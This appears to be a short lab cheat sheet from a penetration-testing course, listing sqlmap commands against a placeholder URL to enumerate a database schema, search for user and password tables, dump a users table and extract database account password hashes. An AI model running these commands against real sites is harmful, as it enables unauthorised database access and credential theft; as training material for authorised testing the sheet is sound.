## DB Schema Enumeration

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
```
## Searching for Data

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
```

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
```
## Password Enumeration and Cracking

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```
## DB Users Password Enumeration and Cracking

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
